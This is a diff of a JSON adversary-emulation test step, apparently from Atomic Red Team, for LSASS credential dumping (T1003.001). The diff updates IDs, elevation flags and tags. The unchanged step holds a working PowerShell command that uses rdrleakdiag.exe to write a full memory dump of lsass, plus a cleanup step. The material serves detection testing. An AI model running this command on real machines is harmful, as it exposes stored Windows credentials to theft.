@@ -7,38 +7,38 @@
   ],
   "steps": [
     {
-      "id": "47eb65b7-0b59-4f12-9e18-2157b4ed2339",
+      "id": "d50c99a7-648d-4a20-b0e1-75efe70d08c2",
       "type": "execute-command",
       "data": {
         "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n\u0026 $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "8aa1c049-b5e0-4502-9fee-1deec11e1f07",
+      "id": "988e01a0-800f-4743-9bb0-cb8e9cd16c16",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "47eb65b7-0b59-4f12-9e18-2157b4ed2339",
+      "s": "d50c99a7-648d-4a20-b0e1-75efe70d08c2",
       "p": "on-success",
-      "o": "8aa1c049-b5e0-4502-9fee-1deec11e1f07"
+      "o": "988e01a0-800f-4743-9bb0-cb8e9cd16c16"
     },
     {
-      "s": "47eb65b7-0b59-4f12-9e18-2157b4ed2339",
+      "s": "d50c99a7-648d-4a20-b0e1-75efe70d08c2",
       "p": "on-failure",
-      "o": "8aa1c049-b5e0-4502-9fee-1deec11e1f07"
+      "o": "988e01a0-800f-4743-9bb0-cb8e9cd16c16"
     }
   ],
   "tags": [
-    "T1003.001",
-    "atomic-red-team"
+    "T1003",
+    "T1003.001"
   ]
 }
